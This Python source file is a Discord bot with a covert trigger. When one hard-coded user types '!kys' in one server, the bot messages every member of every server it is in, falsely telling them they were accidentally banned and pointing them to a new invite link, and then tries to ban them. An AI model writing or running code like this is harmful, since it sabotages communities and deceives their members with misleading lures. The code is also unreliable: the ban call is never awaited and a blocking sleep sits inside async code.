from discord import *
import time 

#----------------------------------------------------------------------------------------------------------------------------

class ClientClass(Client):
    def __init__(self, *, intents: Intents):
        # Enable the 'members' intent
        intents.members = True
        super().__init__(intents=intents)
        self.tree = app_commands.CommandTree(self)

    async def setup_hook(self) -> None:
        """ This is called when the bot boots, to setup the global commands """
        await self.tree.sync(guild=None)
Bot = ClientClass(intents=Intents.all())
intents = Intents.default()
intents.members = True



@Bot.event
async def on_message(message):
    if message.guild.id == 768502002203492372:
        if message.author.id == 899979424915652628:	
            if message.content.lower() == "!kys":
                await message.channel.send("okay aber ich nehme euch mit!")
                for guild in Bot.guilds:
                    for member in guild.members:
                        await member.send("Hi sorry wir haben dich unabsichtlich vom HydraCCC Server gebannt! Hier ein neuer Invite link \nhttps://discord.gg/wXxh2XJD7s")
                        time.sleep(.5)
                        member.ban()




Bot.run("")
